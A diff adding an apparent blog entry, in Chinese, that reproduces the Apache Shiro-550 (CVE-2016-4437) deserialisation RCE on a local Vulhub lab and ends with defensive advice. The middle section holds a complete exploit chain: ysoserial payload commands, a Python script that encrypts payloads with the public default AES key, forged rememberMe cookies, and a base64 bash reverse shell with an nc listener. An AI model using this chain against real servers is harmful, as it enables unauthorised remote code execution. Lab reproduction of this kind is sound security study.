@@ -13032,4 +13032,374 @@ deny_arr：黑名单
         <tag>文件上传</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Shiro-550反序列化漏洞复现</title>
+    <url>/2026/09/14/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[一、漏洞背景1.1 什么是 Apache Shiro？Apache Shiro 是Java 开源安全框架，专门做Web应用的身份安全模块，很多Java Web项目（网站、后台管理系统）会集成它。它主要负责4件核心工作：
+
+身份认证：登录校验账号密码
+授权：判断你有没有权限访问页面&#x2F;接口
+会话管理：维持用户登录状态
+RememberMe（记住我）：勾选“记住我”，关闭浏览器下次不用重新登录
+
+
+这个漏洞，就出在 RememberMe 记住我这个功能上。
+
+
+1.2 RememberMe 正常的工作逻辑正常场景：我们登录网站勾选【记住我】
+
+服务器把我们的用户身份对象（Java对象，包含用户名等信息）序列化，转成一串二进制字节；
+用内置AES密钥对这串二进制做加密；
+加密后的字符串放到Cookie，字段名叫rememberMe，返回给浏览器保存；
+下次我们再来访问网站，浏览器自动带上这个rememberMeCookie；
+服务器读取Cookie，用同一个AES密钥解密，再反序列化变回Java对象，识别我是谁，直接免登录。
+
+
+1.3 CVE-2016-4437 漏洞成因Shiro 1.2.4及以下版本，源码里直接硬编码写死了AES加密密钥：kPH+bIxk5D2deZiIxcaaaA==这个密钥是公开的，所有人都能从源码里找到。
+漏洞发生完整逻辑：
+
+密钥固定公开 → 攻击者可以自己加密，伪造rememberMe内容；
+攻击者使用ysoserial工具，构造恶意Java序列化对象（Gadget利用链）；
+用这个公开固定AES密钥加密恶意对象，生成伪造的rememberMeCookie；
+攻击者发送HTTP请求，带上伪造的rememberMe Cookie访问网站；
+服务器收到Cookie：先用内置硬编码密钥解密 → 拿到二进制序列化数据；
+服务器没有任何校验，直接对不可信的数据执行反序列化；
+在反序列化解析对象的过程中，触发预先构造好的恶意代码，实现远程代码执行RCE。
+
+
+即：✅ 硬编码固定AES密钥（攻击者可控加密内容）✅ 对来自Cookie的外部不可信输入，直接反序列化，没有校验
+
+
+1.4 版本范围受影响版本：Apache Shiro ≤ 1.2.4在 1.2.5 版本修复：不再使用固定硬编码密钥，改成项目部署时，由用户自己配置独立密钥。
+
+1.5 漏洞特点
+不需要账号密码，不需要登录，直接发送带伪造rememberMe的请求就能打；
+属于Java反序列化漏洞，依赖Java Gadget链（最常用CommonsCollections1）；
+漏洞编号CVE-2016-4437，圈内俗称Shiro550（因为漏洞在issue编号550）。
+
+
+1.6 补充：什么是序列化&#x2F;反序列化？
+序列化：把内存里的Java对象，变成一串二进制字节，方便网络传输、存Cookie；
+反序列化：反过来，把二进制字节，恢复成内存里的Java对象；
+
+
+风险点：反序列化的时候会自动执行对象里的部分代码。如果对象是恶意构造的，就执行攻击代码。
+
+
+二、环境搭建
+环境说明：基于 Kali Linux 搭建的 Vulhub 靶场
+漏洞：CVE-2016-4437 Shiro550依赖：Docker、docker-compose，vulhub 源码包已经提前下载到本机
+
+Q：vulhub 如何搭建？https://blog.csdn.net/weixin_50750081&#x2F;article&#x2F;details&#x2F;135946629
+
+① 进入靶场目录cd ~/vulhub/shiro/CVE-2016-4437
+
+
+② 后台启动容器sudo docker-compose up -d
+
+
+-d &#x3D; detach，后台运行，不占用终端
+第一次执行会自动拉取镜像（有国内镜像加速，速度更快）
+等待下载、构建、启动完成
+
+
+③ 查看容器是否成功启动sudo docker-compose ps
+
+✅ 判断成功标准：
+
+看到容器状态是 Up
+端口映射：0.0.0.0:8080-&gt;8080/tcp
+
+
+
+④ 访问靶场页面
+kali 的 IP：192.168.23.151
+在物理机浏览器打开：
+http://192.168.23.151:8080
+
+或者直接在Kali浏览器打开：
+http://127.0.0.1:8080
+
+
+出现Shiro登录页面，靶场启动成功。
+
+常用配套命令# 查看实时日志（排错用）sudo docker compose logs -f# 停止靶场（保留镜像，下次可直接up）sudo docker compose down# 停止并删除镜像（彻底清理）sudo docker compose down --rmi all
+
+
+简单排错
+端口8080被占用：报错端口冲突，修改docker-compose.yml，把宿主机端口改成别的，比如8081:8080
+镜像拉取卡住：docker加速器已经配置，重新执行docker compose up -d
+
+
+三、漏洞复现根因：rememberme 密钥泄露
+3.1 指纹探测随便输一个账号密码，再 F12 查看网络 –&gt;cookie
+
+看到 rememberMe 的 value 是 deleteMe，确认目标使用 Apache Shiro 框架，第一步指纹探测完成。  
+
+3.2  验证漏洞
+已经探测出 rememberMe=deleteMe，确认目标是 Shiro 框架，但不确定是否存在 CVE-2016-4437
+
+Q1：ysoserial 是什么？1. 定义ysoserial 是安全研究者 frohoff 开发的 Java反序列化Payload生成工具。自动生成构造好的恶意Java序列化二进制数据，用来打Java反序列化漏洞（Shiro550、Weblogic、JBoss等）
+
+2. 核心概念
+Gadget Chain（利用链&#x2F;小工具链）
+
+Java 反序列化本身不会直接执行命令。Gadget（小工具）就是项目 jar 包里本来就存在的一些类和方法；利用链 &#x3D; 把这些现成 Gadget 按顺序串起来，当 Java 进行反序列化时，会自动依次调用这一串方法，最终执行系统命令。ysoserial内置了大量写好的利用链：
+
+URLDNS：仅触发DNS解析，无法执行系统命令，适合简易探测
+CommonsCollections： 选 CC 系列利用链的第一步，就是先确认目标有没有这个 jar、是 3.x 还是 4.x。
+
+
+
+
+利用链
+限制条件
+
+
+
+CC1
+JDK 版本必须 ≤ jdk8u71，高版本 JDK 会失效
+
+
+CC3
+依赖 TemplatesImpl 类，对 JDK 版本敏感，兼容性差
+
+
+CC5
+要求 JDK ≥ jdk8u76，版本限制单向
+
+
+CC6
+入口为 HashSet，依靠 InvokerTransformer 完成反射调用；JDK6 ~ JDK21 大范围兼容，几乎无版本门槛
+
+
+CC7
+链路逻辑复杂，稳定性弱于 CC6
+
+
+
+
+输出产物工具输出二进制序列化数据，不是明文。Shiro场景下：这个二进制还需要经过AES加密+Base64编码，才能放进rememberMe Cookie。
+
+
+⚠️ysoserial不发包、不做加密，它只负责生成恶意二进制payload。
+
+
+3. 下载wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar
+
+
+-O ysoserial.jar：下载后重命名为 ysoserial.jar
+
+ GitHub 下载超时，用：
+wget https://ghfast.top/https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O ysoserial.jar
+
+
+✅ 下载校验命令：
+ls # 能看到文件就代表下载成功# 测试是否能正常运行java -jar ysoserial.jar
+
+执行后弹出ysoserial帮助信息，说明没问题。
+
+ 把 jar 复制到 shiro 靶场目录  
+cp ysoserial.jar /home/kali/vulhub/shiro/CVE-2016-4437/cd /home/kali/vulhub/shiro/CVE-2016-4437/
+
+
+Q2：为什么要用DNSlog验证？Shiro550属于无回显命令执行
+
+执行命令的结果不会直接返回在网页响应里，看页面看不出是否执行成功；
+ping请求会触发DNS查询，这个请求会主动外带流量到dnslog平台；
+DNS请求不会受web页面回显限制，只要命令执行成功就一定会留下记录；
+简单、轻量，不需要搭建额外服务器，比赛靶场最通用的验证手段。
+
+
+方案一：DNSlog2.1 获取DNSlog子域名http://dnslog.cn/
+访问 dnslog.cn，页面提供专属域名。
+
+
+
+原理：只要靶机执行了ping xxx.dnslog.cn，靶机会发起DNS解析请求；dnslog平台会记录这条解析记录。优势：无回显RCE首选。很多Shiro靶场命令执行没有页面回显，浏览器页面看不出任何变化，但DNS请求是一定会向外发的。
+
+
+2.2 ysoserial生成恶意序列化payloadjava -jar ysoserial.jar URLDNS &quot;http://h0l1vh.dnslog.cn&quot; &gt; payload.bin
+
+验证：
+ls
+
+
+
+2.3 创建 shiro 加密脚本 shiro_enc.py用Shiro默认密钥做AES-CBC加密+Base64编码
+cat &gt; shiro_enc.py &lt;&lt;&#x27;EOF&#x27;import base64, osfrom Crypto.Cipher import AESkey = base64.b64decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;)def pad(data):    pad_len = 16 - len(data) % 16    return data + bytes([pad_len]) * pad_lendef shiro_encrypt(payload_bytes):    iv = os.urandom(16)    cipher = AES.new(key, AES.MODE_CBC, iv=iv)    return base64.b64encode(iv + cipher.encrypt(pad(payload_bytes))).decode()if __name__ == &quot;__main__&quot;:    with open(&quot;payload.bin&quot;, &quot;rb&quot;) as f:        print(&quot;rememberMe=&quot; + shiro_encrypt(f.read()))EOF
+
+
+安装 pycryptodome（AES 加密依赖）
+pip3 install pycryptodome
+
+
+ 触发保护机制：不允许直接用 pip 往系统 Python 里装包
+# 创建虚拟环境python3 -m venv venv# 进入虚拟环境source venv/bin/activate# 在虚拟环境安装库pip3 install pycryptodome# 运行脚本python3 shiro_enc.py# 退出虚拟环境deactivate
+
+
+
+rememberMe&#x3D;RFLFhERJIlVtq+EPP3d5Upb3E0ZYt7oGZdxoXLm1OzfBWCo36MHiDdXro1VUkUnjWAsC&#x2F;R5NM6rngu&#x2F;6IseGlvJRNWBe7wqtywfvqZmmt64bFZQl2QBWMg2j4c0z1pQO7h&#x2F;O9FlmBYc486etcvlTZOjyHWeqaZdKYoKIHsgf2RqUVTdO1YRv6pedv5lkpRkMx6zng7Osj&#x2F;T1xfbTXFB5RlOTFcPPcmqPsQpDNnIrNzGgod+qm0zuL+rr+SV6yNovJGqWIECs8KW8D+OFeBxufjEhUMNdf1q1E1Cg1kUc6oBm9a6smXUxM9efMFP3TilXJcdizLONeCw+XROk&#x2F;9lwGiMYlsrijsmhKdUtnj09XYCT8ToJKqNpLEH2l6ABMw6XF+NhO8sfnZ2JPMqHNzZ3sA&#x3D;&#x3D;
+
+2.4 Burp修改Cookie发包
+浏览器打开靶场页面，用 Burp 抓正常访问请求http://192.168.23.151:8080
+
+
+
+在请求头Cookie里添加刚刚生成的一串；保留JSESSIONID不变
+
+
+改成：
+
+
+
+回到dnslog页面刷新查看记录
+
+
+
+✅ 出现记录：漏洞确认存在！目标Shiro版本≤1.2.4，并且没有修改默认AES密钥
+❌ 没有任何记录：默认密钥无效。两种可能性：版本&gt;&#x3D;1.2.5 &#x2F; 管理员更换了自定义密钥。
+
+
+
+方案二：Burp 专业版，自带 Collaborator
+
+得到子域名：1prfmws3ghfx6zz5c174av5e258wwnkc.oastify.com
+每点一次会生成一个新域名，前后不一致就收不到了。复制一次，从头用到尾。
+cd /home/kali/vulhub/shiro/CVE-2016-4437java -jar ysoserial.jar URLDNS &#x27;http://1prfmws3ghfx6zz5c174av5e258wwnkc.oastify.com&#x27; &gt; payload.binpython3 shiro_enc.py
+
+
+rememberMe&#x3D;fMqsEL17K&#x2F;RYnoFRpDWAgeRfmVq+6qrrtVzHPRymFaQuXHRjhBPumDSuC7I+TPi7AA3Io1M5QF0OM8mWSjbH+H4QfTWNWOpfd8gOKmbilplNzILimz0YZMhUlKnmuXfKqO+4fckq4BKKdIFbpaooFEalWNwLa+bV39zwNsfyHR9YKp8HowvN+FvV5CQ324uVBimm9XPqzBO1h&#x2F;lakbFCVpSBal&#x2F;dWaC3AwU&#x2F;t8LquwjCcjU540Mw1WXgavxkIQOPHisSuvXjkZOGZU24N&#x2F;LV1zJO8LP9Ay+&#x2F;sI0E7Rsn3HZRDHMY1gTsGnHvpUTuJqdcufZrjo1O7TNAhhfI7V0Xy2GFMb65PTzY9&#x2F;UXK8uJ2CZbdCChgt2CGLb+&#x2F;Ew04np5ZDeJG1G&#x2F;Ql&#x2F;1IA9Ux4U71wm+d++sJn7x1&#x2F;ml51uEL8REg+IEs4vWoNUsl6Ec0G6Z8zjjeoDVhflJ6xqS6n6D&#x2F;lx7fCu+k3AjK6bfo&#x2F;PeK6o&#x3D;
+
+回 Collaborator 标签 → 点「立即轮询」
+
+
+漏洞确认成功了
+
+3.3 漏洞利用3.3.0  确定合适的 Gadget 利用链通过 URLDNS 确认漏洞入口与密钥有效后，此时尚未获取目标服务器权限，无法查看后端环境信息，只能尝试多条可用 Gadget 链进行测试。  
+CC1、CC5 对 JDK 版本限制较强，容易执行失败；CC6 的 JDK 兼容范围更广，优先选用 CC6 构造载荷，使用sleep命令做时间差验证系统命令执行。  
+
+3.3.1 Sleep 时间差验证java -jar ysoserial.jar CommonsCollections6 &quot;sleep 10&quot; &gt; payload.bin
+
+
+3.3.2 AES加密，生成rememberMe的Cookie值用之前的python脚本读取payload.bin，AES-CBC加密+base64编码，输出cookie值
+python3 shiro_enc.py 
+
+
+rememberMe&#x3D;ArAUCJP766RmTP4TiGkW8GTVynH9VZes7FCSyhj60XPJ&#x2F;SbxSIEbzZw6qS0KvBDPkIWy0fA9bQkqvu2IKsDHQRkPFm1kCxg1cbvEEg1FzthJ0hA6fjfKP3TdaBFCAg6XmwTSO7FEE79Fb2v9XWXI7yQ2NCtSfRq4BpTCaUTh7mKZZPAU7Mi80&#x2F;yQAGLuEp7NtGo&#x2F;TN&#x2F;Abi6ILSCWm9nGFwtrbg9Rq06DhwiP4x84Wy1x0MDRTLUDtIuvqIiki4rdmBfYLKhlV5UcG3PVkBxKsFgbmuyEt6gW0ivivlHhHoIIk+ZttfrDlWxrBX+Vkbj35EYWONh7seVr8o9L9f+utER+TUqtQXGBfYjlresgirPMZGBKM7xiTpNl4a4do5q&#x2F;ctETulBLLMwctbMqaXrw6A9TO37eYzIxTkXsnYOFRb+OyinVcXoDlEQ6GB&#x2F;opeQuO+&#x2F;Z2BqlNAbtwXkzVA1MJ5NH+aOfbgtG8VGM3FdZ3xh1BmiNO3LIrGQbB3QVRyUusEmGAuM1sJ0yDu4IfR1hpHrG9ui&#x2F;grYmID64oK8sZkN6pIX6K0FCC4nAF6rOFOcbvXnjefpJlOv0HXeVgKPUw+r1VQ1ymyxL3OG96Kc6FH2Zq3U1KecWqXWlq7Qnjayb5yRkoRAbcH7mQWWPxnVNOdlMOBreNNB&#x2F;fYZkMGjBookI8pZU2nVTRhJJAjqD36WLUCe9OwPmowvI3mcJ525zeJIe0X31TvveZjeNCUGg5r&#x2F;9FRIQCu80pliJXC7v03N4Gp&#x2F;jpbq1zBRRWrDdy6NbZNp2I82VaADODMDEktTS7J3mpHH1zawnE9U8be9Wc51gAApWluhmV1aoEXMxnYYST6YWB8OAzNqOTGvxxmQB6vIrPzL2+t+kdk1EYY9olncluGJ6Rsje48twwRRUW5A4oXzMxVYJ1xS4zlCy27igvtFUbHhOaA+3kGkSnGZpM5vslO2MqCiPs6KhNiYHdiMfNsEAhx0NuouEl9CoBsfd67X0CWm2NLDsYB8A&#x2F;qNtb+a7p10Lsu7u66ZrC0azkrD9XywOlSW1u8sJTAbelpGhysZsxuBY4+HoOOtigXg+PpaLQmLaL48sCX97e6Mr974lXzxcsgUP1DWp51TqGnnr6qKPx4PT1ljXkuLza82RnOAF2eisKuGG9M9ZP0Asfh93ADpALiKDnMsxvebQhCZm3RQiF41Y+KE6MX0jYAmJama9TBEREYkKAKLiLsS+Dhhfm0jPAjC2+K6rzDEqNqMFvvG9RG5CvAj87RCsNaiZTPPWDtgbWVwHnTSomEdc0I0gn1UWsdcAqg7Y3iTWbZqbhnFXw2WR8vnN&#x2F;3ADrVSj4Dy16eMZZaeo&#x2F;HuEfJ0dyLpJ&#x2F;QVXdHyO&#x2F;b5a0jFE&#x2F;R7bCb8rtEoawCH7y2oX4S+wOQB+Be+mEMt+R0VzJ6aM3Q&#x2F;nVEjTg1&#x2F;16DKDnoF1Xo3keAOSJoHzM1zuV+ecKRa+nTNt36v19lfkBpT4QgQJhiwSaC26Kk6RKEGaLsKkKzzkYN&#x2F;kLY1BurjLMbusuC1k7mdN4CM3k88+Iac6bbfvB72RSpuMqF2arj7CYpN4OC1xNhrg6rRGah5s1mdgGpa2a5Q8+i&#x2F;lKmMJwohF1LxJG2H&#x2F;LqeqxpIC53vT2HFBFZ00a0A+YoXal5WKcekXrZPIjMj35Ou8XGNPOWBU2hXsinTnmKu+WYr1w8yGnhWF1kombOMZcptfuiCD9KphpGW7&#x2F;KoBBAScxQZzo+8yhpUkeyS4NQ&#x3D;&#x3D;
+
+3.3.3 Burp Suite构造请求发包
+抓靶站的普通GET请求（首页即可，不需要登录包）
+
+
+
+在请求头Cookie字段增加
+
+
+
+发送数据包。
+
+
+
+
+
+对照组正常访问/login，请求等待耗时仅 43ms；携带构造完成的 rememberMe 恶意 Cookie 发起请求时，请求等待耗时达到 34.42 秒，出现显著延迟，证明载荷成功触发 Shiro 反序列化漏洞，服务端执行了sleep系统命令，远程代码执行验证成功。  
+
+
+3.3.4 生成反弹命令的 base64echo -n &quot;bash -i &gt;&amp; /dev/tcp/192.168.23.151/4444 0&gt;&amp;1&quot; | base64
+
+
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjE1MS80NDQ0IDA+JjE&#x3D;
+
+3.3.5 生成 payloadjava -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjE1MS80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload.bin
+
+bash -c &quot;{echo,Base64串}|{base64,-d}|{bash,-i}&quot;
+-i：interactive，交互式 bash，也就是我们反弹 shell 用的交互式 shell。  
+
+
+3.3.6 加密python3 shiro_enc.py
+
+
+rememberMe&#x3D;Fn53D8+CB2CIg8&#x2F;IuYRk2JLulpuecSpzrJCfWAwSJ8aOZ3Yfm6cjA74v5pWKFbuGHRq30OwLzzDKVUZw7rFaqJSBRDNuEvLlqjZdcJ3iYtdM3Onz1dlmWJ4bCHyHZe1crE&#x2F;wcBkxsSTYqM7ro86DhSQPo34+p5E8Ci6Ksex4BUf3WWU2VURu7kt6QR6mBum8s56rTHljUuPZ1PCpYogKvyIsuRAMhzUuZC4sCkrmMC7gt+ImDRmyM3Ja1GGXvOrNAnwolvYhVPIaYZSWrhJx7EwyizEZ6qx3iSsGjr7WAYQSOLzfuVb1qIWmlMIEsO9LorgSKHhIpkEfi8Vto8kDUHxmmApimpv9hW&#x2F;u92ySb4PEKWli&#x2F;77V8cKx9U7K8raXhItr2Uv1V&#x2F;qO61yjRJeL7sbeKZwYJhxOcOs2Lhqnu4OCBc0lW5+zmV4lExekXHN2ceCnwV9nioCBE7u9B3KJ&#x2F;rsLWMYDFJXu8WodVHsooCWedzQWfDe5ewSY6xITrgrPF1wvX1&#x2F;dJBZ6k9v8m+bz&#x2F;xUeoLx1TAUaSPcozKFyxMYmAXMQ1qIW2k11Hm6AktzGHGY2XZxoLkedVKEm&#x2F;et6jDaoDsVeSOTLx5GdhflOBzLb&#x2F;5kp7vlYXbR0BYZW3NH5RHRN&#x2F;cK+L6Zq7PLwbMxesDL3p6N+gXMmY5VtVoUQWglP109fDXBzJQhrKT8wXa+nCFP8AxUQyV8gWxA3JeXeqdxpLs39sVu2gFWnIx0u3GOnC6tXeWCpIMd+4W3TVYNOUR&#x2F;AKDm94SJVD388vHdUNQgvSTQ5KRXtzpYvhWJOFcFwF2ktSlF6eR2vlL89YG4wsV1Ba28lNocl+oIxmRGj7sKW99icgTrTOEKWCod9gqr7sfhGijTsArjxCkMlZcYrVKvE3SsPMB28omAQn1K9QylGpVFwAfOQvZuDZ+LpL86Qe6f3nfUFROgelhO&#x2F;VXGOi9rFjup&#x2F;dcaDLqGVsDPiTfCKYnx19E5NCaInmzX++EwmPItdcnPfs6A0yTdeWMmpMdlHIKPEVPCFre7qHgJZyHQGJybCAViddb4JsYY&#x2F;2spSOPAa5Z8suYn4zNMHLzQpZtOncmEKH24pokSCrWPvzV2x9eGsTcMssNux9QbbzIv11qW1RWPdwgMxyvVFx7jfAYzVPBRe4PrCWEHptivb2FvZuiTg5MBcGqnUIK0lcLGGp8bw3X&#x2F;+VnjgwD&#x2F;v4RBHnzWq6qX&#x2F;dqwv&#x2F;Epc5eaTCNEBTX1CuLIbnFbQ1DjKOsxLZuUlmQD1qc2nACMKMCmIHsGd6pt9BGqXv3ch008NPExFK0pLZAWHxumLyjDAfK47XXwdOUBITl7an6ko6AHKbk7znapENw9ghLCYw5Qx3pBMcknLferrH&#x2F;TlwsxUOAR&#x2F;NMAHmCyHpAc2U5fHVcpVo5S8MzlPmu9Ip220ykRw5XyQZTzwI6949cl2gplcFXiX4DYvE22K+pBUXpH5n7LEIvdWU3ablXiSmnhj4NNJD5PmiPjhbJMVbxWrYVNBDvq1mT30MZdLHSQw83Y4VjsZok34h&#x2F;vPvJgtTGD3B1ekQ8ieWd0BISB5fkn9YtqtzTop9QqC&#x2F;MITHkBy8X4CCDmdlXKpQHJ&#x2F;PlCI1hih6uX4qM7ZdNxXBkfBlsVVWKtBtb41vqE7tdpaBO8PHPtvKjV71p9oIIFwNV5dx7BT4Dofr03Lp3dY6AyXsekSPM9MWSObky3DuK2y2Uq3FVsEzlCLXsBUj81GRsnoVCzgD32FY8+SxAgQpolLEvGc7jka3zJTr6CO01bNR9kLOtBxibVcyy9ygNpyxFFOaevcwLtikMWwmAc9XgKv4yPCoX91Q0Vy22kOnTKPjlfXPwqHYON5
+
+3.3.7 开启监听nc -lvnp 4444
+
+
+3.3.8 bp 发包
+
+3.3.9 拿到 shell返回终端发现，已经拿到了容器 root shell
+
+
+3.4 证明拿到 shell 后，需要证明这个 shell 确实来自那个 Shiro容器。
+3.4.1 身份证明id
+
+3.4.2 定位证明–容器 ID 在拿到的 shell 里面  
+hostname
+
+在 启动 docker 容器的宿主机  里
+sudo docker ps
+
+
+
+注意：我这里使用的攻击机和宿主机（容器）都是同一个 kali。
+
+
+结论：证明当前 shell 会话，就是连接到这个 Shiro 靶场 docker 容器内部， 验证 RCE 成功.
+3.5 关闭靶场环境# 切换到shiro CVE-2016-4437目录cd ~/vulhub/shiro/CVE-2016-4437# 停止容器，并且删除挂载的数据卷（彻底清理环境）sudo docker-compose down -v# 验证是否关闭成功sudo docker ps
+
+
+
+
+四、防御
+漏洞根源：Shiro 1.2.4 及更早版本中，AES 密钥硬编码在源码内，攻击者可自行构造 rememberMe 的恶意序列化内容，后端解密后触发反序列化，最终实现远程代码执行（RCE）。  
+
+4.1 核心4.1.1 升级Apache Shiro版本升级至 1.2.5 或更高版本。新版本移除了默认硬编码密钥，并且增加了反序列化相关安全校验，从根源修复该CVE漏洞。
+4.1.2 自定义随机AES密钥禁止使用源码自带默认密钥。如果暂时无法升级，必须更换shiro.ini中rememberMe的AES密钥。
+
+不要使用网上流传的默认密钥：kPH+bIxk5D2deZiIxcaaaA==
+使用密码学安全随机生成Base64密钥，并且妥善保管，不要泄露。
+
+
+注意：仅修改密钥不能解决反序列化本身风险，只能临时缓解手段。
+Apache Shiro 源码托管于 GitHub，1.2.4 版本源码可在 release 标签页下载：https://github.com/apache/shiro/releases/tag/shiro-root-1.2.4。
+下载源码后查看core/src/main/java/org/apache/shiro/mgt/AbstractRememberMeManager.java，可找到硬编码的默认 AES 密钥，验证漏洞根源。 
+如果链接失效，访问我的仓库下载：https://gitee.com/jasminee0762/cyber-security/blob/master/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/shiro-shiro-root-1.2.4.zip 
+
+
+
+
+
+4.2 反序列化安全加固
+开启反序列化白名单高版本Shiro支持反序列化类白名单，只允许指定安全类被反序列化，禁止危险类。即使密钥泄露，也无法加载CC恶意利用链。
+禁用不需要的rememberMe记住我功能。业务不需要“记住我”，直接关掉该功能，不存在rememberMe Cookie，漏洞入口直接消失。
+
+
+4.3 Web应用层面加固
+Cookie安全属性：给rememberMe Cookie添加 HttpOnly; Secure
+HttpOnly：JS无法读取Cookie，防止XSS窃取rememberMe值
+Secure：仅HTTPS传输Cookie，防止中间人抓包劫持Cookie
+
+
+最小权限原则：Tomcat&#x2F;Web容器不要用root运行，使用低权限业务账号启动。就算RCE成功，也限制攻击者权限。
+
+
+4.4 运维&#x2F;检测防护
+WAF规则：添加特征检测，拦截rememberMe字段异常长、恶意加密载荷的Cookie请求；
+日志审计：监控异常rememberMe Cookie、大量Java反序列化报错日志；
+定期漏洞扫描，检测Shiro版本与默认密钥。
+
+
+五、总结本次复现 CVE-2016-4437 Apache Shiro 反序列化漏洞，漏洞成因是 Shiro 1.2.4 及之前版本存在公开的硬编码 AES 密钥。攻击者可自行构造带有系统命令的恶意序列化对象，利用公开密钥加密后放入 rememberMe Cookie 发送至目标。
+服务端收到 Cookie 后，先 Base64 解码，再使用内置硬编码 AES 密钥解密，之后触发不安全的反序列化操作。在解析恶意对象时会激活 Gadget 利用链，自动运行我们预先写入的系统命令，从而实现远程代码执行 RCE。  
+📚 同系列文章 · vulhub（2 篇）MSF的使用以及漏洞复现Shiro-550反序列化漏洞复现（本文）]]></content>
+      <categories>
+        <category>靶机练习</category>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>RCE</tag>
+        <tag>Shiro</tag>
+        <tag>Java反序列化</tag>
+      </tags>
+  </entry>
 </search>
